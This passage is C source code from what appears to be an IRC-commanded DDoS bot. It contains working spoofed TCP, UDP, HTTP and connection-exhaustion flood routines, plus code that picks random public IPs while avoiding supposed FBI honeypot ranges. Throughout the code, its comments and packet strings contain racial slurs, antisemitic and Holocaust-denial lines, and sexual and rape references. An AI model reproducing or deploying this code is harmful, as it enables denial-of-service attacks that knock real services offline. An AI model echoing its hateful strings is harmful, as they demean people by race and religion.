                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if(a >= 100) {
                    if(time(NULL) >= start+secs) exit(0);
                    a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}

void phatwonk(int sock, char *sender, int argc, char **argv) {
        // Phatwonk attack coded by Freak
        // Based off of PAN, modified to attack on 31 portz
        // You can set ANY TCP flag!
        // You can attack with xmas, all flags at once, usyn (urg syn), and any TCP flag combination you wish!
        // It's very hard to block and can down virtually every service at once
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        unsigned int portz[] = { 21,22,23,25,53,80,81,88,110,113,119,135,137,139,143,443,445,1024,1025,1433,1500,1720,3128,3306,3389,5000,5900,6667,6697,8000,8080 };
        int howmanyportz = NUMITEMS(portz);
        time_t start=time(NULL);
        if(mfork(sender) != 0) return;
        int get;
        if((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        if(argc < 3) {
                Send(sock, "NOTICE %s :PHATWONK <target> <flags/method> <secs>\n", sender);
                exit(1);
        }
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock, "NOTICE %s :Phatwonking %s\n", sender,argv[1]);
        // Start preparing RAW TCP socket
        sin.sin_family = AF_INET;
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.syn = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.urg_ptr = 0;
        if(!strcmp(argv[2], "all")) {
                send_tcp.tcp.syn = 1;
                send_tcp.tcp.rst = 1;
                send_tcp.tcp.fin = 1;
                send_tcp.tcp.ack = 1;
                send_tcp.tcp.psh = 1;
                send_tcp.tcp.urg = 1;
        } else if(!strcmp(argv[2], "xmas")) {
                send_tcp.tcp.fin = 1;
                send_tcp.tcp.psh = 1;
                send_tcp.tcp.urg = 1;
        } else if(!strcmp(argv[2], "usyn")) {
                send_tcp.tcp.syn = 1;
                send_tcp.tcp.urg = 1;
        } else {
                unsigned char *pch = strtok(argv[2], ",");
                while(pch) {
                        if(!strcmp(pch,         "syn")) { send_tcp.tcp.syn = 1;
                        } else if(!strcmp(pch,  "rst")) { send_tcp.tcp.rst = 1;
                        } else if(!strcmp(pch,  "fin")) { send_tcp.tcp.fin = 1;
                        } else if(!strcmp(pch,  "ack")) { send_tcp.tcp.ack = 1;
                        } else if(!strcmp(pch,  "psh")) { send_tcp.tcp.psh = 1;
                        } else if(!strcmp(pch,  "urg")) { send_tcp.tcp.urg = 1;
                        } else {
                        }
                        pch = strtok(NULL, ",");
                }
        }
        send_tcp.tcp.window = 2048;
        send_tcp.ip.daddr = daddr;
        sin.sin_addr.s_addr = send_tcp.ip.daddr;
        send_tcp.ip.check = 0;
        send_tcp.tcp.check = 0;
        pseudo_header.dest_address = send_tcp.ip.daddr;
        pseudo_header.placeholder = 0;
        
        while(1) {
                dest = portz[realrand(0, howmanyportz)];
                source=getspoof();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = source;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if(a >= 100) {
                    if(time(NULL) >= start+secs) exit(0);
                    a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}

void makeRandomShit(unsigned char *buf, int length) {
    srand(time(NULL));
    int i = 0;
    for(i = 0; i < length; i++) buf[i] = (rand() % 255) + 1;
}

void unknown(int sock, char *sender, int argc, char **argv) {
/*
    Non spoof UDP flooder modded by Freak/SynthMesc
    Now has port and packetsize options
    and an option for random port and packetsize! (just enter 0)
    Each packet is unique!
    Cheers homies.
    only shout iz here and it is to:
    kod for all the help you gave me and showing me kaiten in the first place!
    luv u bb <3
*/
    int fd,i,packetsize,index;
//    int flag = 1;
    int randport = 0;
    int randsize = 0;
    unsigned long secs;
    struct hostent *hp;
    struct sockaddr_in in;
    time_t start = time(NULL);
    char *packsize;

    if(argc < 4) {
        Send(sock, "NOTICE %s :UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>\n", sender);
        exit(1);
    }
    
    if(mfork(sender) != 0) return;
    
    unsigned char *packet = malloc(1024);
    memset(packet, 0, 1024);
    
    if(!strcmp(argv[2],"0")) {
        randport = 1;
    }
    
    if(!strcmp(argv[3],"0")) {
        randsize = 1;
        packsize = "random";
    } else {
        packsize = argv[3];
    }
    
    srand(time(NULL));
    
    secs=atol(argv[4]);
    memset((void*)&in,0,sizeof(struct sockaddr_in));
    
    in.sin_addr.s_addr=host2ip(sender,argv[1]);
    in.sin_family = AF_INET;
    
    if(randport == 0) {
        in.sin_port = htons(atoi(argv[2]));
        packsize = argv[3];
    }
    
    Send(sock, "NOTICE %s :Unknowning %s:%s with packet size %s\n", sender, argv[1], argv[2], packsize);
    while(1) {
        if(randport == 1) {
            in.sin_port = htons(realrand(1026, 65535));
        }

        if(randsize == 1) {
            makeRandomShit(packet, realrand(64, 1024));
        } else {
            makeRandomShit(packet, atoi(argv[3]));
        }
        
        if((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
        else {
//            ioctl(fd, FIONBIO, &flag); whoever did this was fucking retarded lmao
            sendto(fd, packet, strlen(packet), 0, (struct sockaddr*)&in, sizeof(in));
            close(fd);
        }
        if(i >= 100) {
            if(time(NULL) >= start+secs) {
                break;
            } else {
                i=0;
            }
        }
        i++;
    }
    close(fd);
    exit(0);
}

int listFork() {
        uint32_t parent, *newpids, i;
        parent = fork();
        if(parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}


void SendTheSTD(unsigned char *ip, int port, int secs) { // Faster STD attack with absolutely fucking hilarious packets. Modded by Freak
    int iSTD_Sock;
    iSTD_Sock = socket (AF_INET, SOCK_DGRAM, 0);
    time_t start = time (NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname (ip);
    bzero ((char *) &sin, sizeof (sin));
    bcopy (hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    char *STD_STRING = "KEKSTD"; // this value never gets sent. just a placeholder. lawl
    unsigned int a = 0;
    int targetPort;
    char *randstrings[] = {
        "std", "dts", "lsk",
        "kek", "smack", "ily",
        "tfw no gf", "frienzoned",
        "tyf", "pos", "cunts", "NullzSec", "NullzSec rox", "NullzSec ROX",
        "get raped", "not a ddos packet", "also not a ddos packet", "seriously not a ddos packet",
        "GET / HTTP/1.1\r\nHost: goatse.info\r\n\r\n", "GET / HTTP/1.1\r\nHost: tubgirl.ca\r\n\r\n",
        "GET / HTTP/1.0\r\nHost: goatse.info\r\n\r\n", "GET / HTTP/1.0\r\nHost: tubgirl.ca\r\n\r\n",
        "8======D~~~~~~~","suck it", "give succ",
        "big nigger dick 8============================D", "( . Y . ) tiddies",
        "bigNullz", "eye pee rape", "eye pee address rape", "IP rape", "eye pee address rape",
        "This is LOIC", "LOIC", "HOIC", "XOIC", "LHXOIC", "A cat is fine too. Desudesudesu~", // LOIC packets. KEKEK
        "the biiiiig pussy", "benis" , "penis", "dick", "vagina", "clitoris", "pussy", "tfw", ":^}", "dic pic?", "send nudes",
        "https://youtu.be/dQw4w9WgXcQ", "Never gonna give you up",
        "Never gonna make you cry", "Never gonna let you die", "Never gonna hurt you",
        "bush did 9/11", "jet fuel can't melt steel beams", "9/11 was an inside job",
        "the illuminati is real", "wake up sheep", "i flex like david ike", "6 million jews? show me the proof!",
        "T R I G G E R E D", "my gf killed herself", "free masons suck cock", "ihatejews", "urgay", "tfw u like dick", "dickbutt",
		"The elusive dickbut", "Heyyy that's pretty gooood", "NSA sucks cock", "FBI sucks cock", "You name it they suck cock"
		"What am I doing with my life", "Oh yeah I like nulling shit", "HIIYYOOOOOOO (Customgrow420)", "Keemstar is a fucking knome", "Leafy is gawd <3",
		"Ourmine is full of skids", "STC is the greatest"
    };
    while(1) {
        if(port == 0) {
            targetPort = realrand(1, 65535);
        } else {
            targetPort = port;
        }
        STD_STRING = randstrings[rand () % (sizeof (randstrings) / sizeof (char *))];
        sin.sin_port = targetPort;
        connect(iSTD_Sock, (struct sockaddr *) &sin, sizeof (sin));
        send(iSTD_Sock, STD_STRING, strlen(STD_STRING), 0);
        if(a >= 100) {
            if(time(NULL) >= start + secs) {
                close(iSTD_Sock);
                _exit(0);
            }
            a = 0;
        }
        a++;

    }
}

void sendSTD(int sock, char *sender, int argc, char **argv) {
    //!* STD TARGET PORT TIME
    if(mfork(sender) != 0) return;
    if(argc < 3) {
        Send(sock, "NOTICE %s :STD <ip> <port> <time>\n", sender);
        exit(1);
    }
    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if(strstr(ip, ",") != NULL) {
        unsigned char *hi = strtok(ip, ",");
        while(hi != NULL) {
            if(!listFork()) {
                Send(sock, "NOTICE %s :STD attacking %s:%s\n", sender,hi,argv[2]);
                SendTheSTD(hi, port, time);
                 _exit(0);
            }
            hi = strtok(NULL, ",");
        }
    } else {
        if(listFork()) {
            exit(1);
        }
       Send(sock, "NOTICE %s :STD attacking %s:%s\n", sender,argv[1],argv[2]);
       SendTheSTD(ip, port, time);
       _exit(0);
   }
}

struct sa_in {
    unsigned short int sin_family, sin_port;
    struct {
        unsigned int s_addr;
    }
    sin_addr;
    unsigned char sin_zero[8];
};

int get_iface_ip(struct sockaddr_in *ip, char *iface)
{
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    int ret = ioctl(fd, SIOCGIFADDR, &ifr);
    if(ret != 0)
    {
        return 0;
    }
    close(fd);
    ip->sin_family = AF_INET;
    ip->sin_addr = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr;
    return 1; 
}

int getHost(unsigned char *toGet, struct in_addr *i) {
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

struct tcp_thread_data{
        unsigned char *target;
        int port;
        int secs;
        unsigned char *flags;
        int packetsize;
        int pollinterval;
        int spoofit;
};

static void printchar(unsigned char **str, int c) {
        if(str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
        register int pc = 0, padchar = ' ';
        if(width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if(len >= width) width = 0;
                else width -= len;
                if(pad & PAD_ZERO) padchar = '0';
        }
        if(!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }
        return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;
        if(i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }
        if(sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';
        while(u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }
        if(neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args ) {
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];
        for (; *format != 0; ++format) {
                if(*format == '%') {
                        ++format;
                        width = pad = 0;
                        if(*format == '\0') break;
                        if(*format == '%') goto out;
                        if(*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while(*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if(out) **out = '\0';
        va_end( args );
        return pc;
}

int szprintf(unsigned char *out, const unsigned char *format, ...) {
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}

char *thanks = "thanks to unhappygh0st for the honeypot ip ranges :)";

in_addr_t getRandomPublicIP()
{
        uint8_t ipState[4] = {0};
        ipState[0] = rand() % 224;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;

        while(
                (ipState[0] == 0) ||
                (ipState[0] == 10) ||
                (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
                (ipState[0] == 127) ||
                (ipState[0] == 169 && ipState[1] == 254) ||
                (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
                (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
                (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
                (ipState[0] == 192 && ipState[1] == 168) ||
                (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
                (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
                (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
                (ipState[0] == 62 && ipState[1] <= 30) || //Honeypot
                (ipState[0] == 207 && ipState[1]  >= 31 && ipState[2] <= 120) || //FBI Honeypots (207.31.0.0 - 207.120.255.255) 
                (ipState[0] == 65 ) && (ipState[1] >= 224) && (ipState[2] <= 226) || // More FBI Honeypots (64.224.0.0 - 64.226.255.255)
                (ipState[0] == 195) && (ipState[1] == 10) || //Yet another FBI Honeypot. 
                (ipState[0] == 216) && (ipState[1] == 25 || ipState[1] == 94) || //Fucking nigger LOL (FBI Honeypots)
                (ipState[0] == 212) && (ipState[1] == 56) //The fuck?! 212.56.107.22 - uhhhhm. FBI Honeypot. 
        )
        {
                ipState[0] = rand() % 224;
                ipState[1] = rand() % 255;
                ipState[2] = rand() % 255;
                ipState[3] = rand() % 255;
        }

        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}

void SendTCP(void *par1) {
        if(listFork()) return;
        struct tcp_thread_data *td = (struct thread_data *)par1;
        unsigned char *target = td->target;
        int port = td->port;
        int timeEnd = td->secs;
        unsigned char *flags = td->flags;
        int packetsize = td->packetsize;
        int pollinterval = td->pollinterval;
        int spoofit = td->spoofit;
    
        register unsigned int pollRegister;
        pollRegister = pollinterval;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd) { return; }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) { return; }
        in_addr_t netmask;
        if( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getspoof() ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        if(!strcmp(flags, "all")) {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
                tcph->urg = 1;
        } else if(!strcmp(flags, "xmas")) {
                tcph->fin = 1;
                tcph->psh = 1;
                tcph->urg = 1;
        } else if(!strcmp(flags, "usyn")) {
                tcph->syn = 1;
                tcph->urg = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch) {
                        if(!strcmp(pch,         "syn")) { tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst")) { tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin")) { tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack")) { tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh")) { tcph->psh = 1;
                        } else if(!strcmp(pch,  "urg")) { tcph->urg = 1;
                        } else {
                        }
                        pch = strtok(NULL, ",");
                }
        }
        tcph->window = 2048;
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = csum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1) {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                iph->saddr = getspoof();
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = csum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                if(i == pollRegister) {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}

void tcpflood(int sock, char *sender, int argc, char **argv) { // Advanced TCP flooder. Multithreading/SynthMesc.
    if(mfork(sender) != 0) return;
    if(argc < 7 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || (argc > 5 && atoi(argv[5]) < 0) || (argc == 7 && atoi(argv[6]) < 1)) {
        Send(sock, "NOTICE %s :TCP <target> <port> <time> <flags/method> <packetsize> <pollinterval> <threads>\n", sender);
        return;
    }
    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    unsigned char *flags = argv[4];
    int packetsize = argc > 5 ? atoi(argv[5]) : 0;
    int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
    int num_threads = atoi(argv[7]);
    int spoofed = 32;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    struct tcp_thread_data td[num_threads];
    unsigned char *hi = strtok(ip, ",");
    int i;
    for(i = 0; i < num_threads - 1; i++){
        td[i].target = i;
        td[i].port = port;
        td[i].secs = time;
        td[i].flags = flags;
        td[i].packetsize = packetsize;
        td[i].pollinterval = pollinterval;
        td[i].spoofit = spoofed;
        SendTCP((void *) &td[i]);
    }
    Send(sock, "NOTICE %s :TCP flooding %s:%d with %s and %d threads\n", sender, hi, port, flags, num_threads);
    sleep(time);
    exit(0);
}

int socket_connect(char *host, unsigned short int port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if(sock == -1) return 0;
    if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}

// HTTP Flood
void sendHTTP(void *host, char *method, int port, char *path, int timeFoo, int power){
    const char *connections[] = { "close", "keep-alive", "accept" };
    int i, timeEnd = time (NULL) + timeFoo;
    char request[1024];
    char *myUA = UserAgents[(rand () % NUMITEMS(UserAgents))];
    char *myCon = connections[(rand () % 3)];
    int myLen = 55 + strlen(method) + strlen(path) + strlen(myUA) + strlen(myCon);
    if(myLen >= 1024) {
        return;
    }
    snprintf(request, myLen, 
         "%s %s HTTP/1.1\r\nAccept: */*\r\nUser-Agent: %s\r\nConnection: %s\r\n\r\n",
         method, path, myUA,
         myCon);
    for (i = 0; i < power; i++) {
        if(fork ()) {
            while(timeEnd > time (NULL)) {
                int socket = socket_connect(host, port);
                if(socket != 0) {
                    write(socket, request, strlen(request));
                    close(socket);
                }
            }
            _exit (1);
        }
    }
}

void *HTTP(int sock, char *sender, int argc, char **argv) {
    
    // !* HTTP METHOD TARGET PORT PATH TIME POWER
    // !* HTTP GET hackforums.net 80 / 10 100
    if(mfork(sender) != 0) return;
    if(argc < 6) {
        Send(sock, "NOTICE %s :HTTP <method> <target> <port> <path> <time> <power>\n", sender);
    }
    Send(sock, "NOTICE %s :HTTP %s flooding %s with %d power\n", sender, argv[2], atoi(argv[6]));
    if(strstr ((const char *) argv[1], ",") != NULL) {
        unsigned char *hi = (unsigned char *) strtok ((char *) argv[1], ",");
        while(hi != NULL) {
            if(!listFork ()) {
                sendHTTP (argv[1], argv[2],
                     atoi(argv[3]), argv[4],
                     atoi(argv[5]), atoi(argv[6]));
                _exit (0);
            }
            hi = (unsigned char *) strtok (NULL, ",");
        } 
    } else {
        if(listFork ()) {
            return;
        }
        sendHTTP (argv[1], argv[2],
                     atoi(argv[3]), argv[4],
                     atoi(argv[5]), atoi(argv[6]));
        _exit (0);
    } 
}

//   __             __          ___ _                 _
//   \ \  /\ /\  /\ \ \/\ /\   / __\ | ___   ___   __| |
//    \ \/ / \ \/  \/ / //_/  / _\ | |/ _ \ / _ \ / _` |
// /\_/ /\ \_/ / /\  / __ \  / /   | | (_) | (_) | (_| |
// \___/  \___/\_\ \/\/  \/  \/    |_|\___/ \___/ \__,_|

void sendJUNK(unsigned char *ip, int port, int end_time)
{

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if(getHost(ip, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t
    {
        int fd;
        uint8_t state;
    } fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    unsigned char *watwat = malloc(1024);
    memset(watwat, 0, 1024);
    int packetLen = 1024;
    
    int end = time(NULL) + end_time;
    while(end > time(NULL))
    {
        for(i = 0; i < max; i++)
        {
            switch(fds[i].state)
            {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd, &myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                    if(res == 1)
                    {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                        if(valopt)
                        {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if(res == -1)
                    {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    //nonblocking sweg
                    packetLen = realrand(32, 1024);
                    makeRandomShit(watwat, packetLen);
                    if(send(fds[i].fd, watwat, packetLen, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
                    {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}

char *junk(int sock, char *sender, int argc, char **argv) {
    if(argc < 3 || atoi(argv[3]) < 0) {
        Send(sock, "NOTICE %s :JUNK <ip> <port> <time>\n", sender);
        return;
    }
    if(mfork(sender) != 0) return;
    Send(sock, "NOTICE %s :JUNK flooding %s:%s\n", sender, argv[1], argv[2]);
    sendJUNK(argv[1], atoi(argv[2]), atoi(argv[3]));
}

//              _     _     ___ _                 _
//   /\  /\___ | | __| |   / __\ | ___   ___   __| |
//  / /_/ / _ \| |/ _` |  / _\ | |/ _ \ / _ \ / _` |
// / __  / (_) | | (_| | / /   | | (_) | (_) | (_| |
// \/ /_/ \___/|_|\__,_| \/    |_|\___/ \___/ \__,_|

void sendHOLD(unsigned char *ip, int port, int end_time)
{

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if(getHost(ip, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t
    {
        int fd;
        uint8_t state;
    } fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    int end = time(NULL) + end_time;
    while(end > time(NULL))
    {
        for(i = 0; i < max; i++)
        {
            switch(fds[i].state)
            {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd, &myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                    if(res == 1)
                    {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                        if(valopt)
                        {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
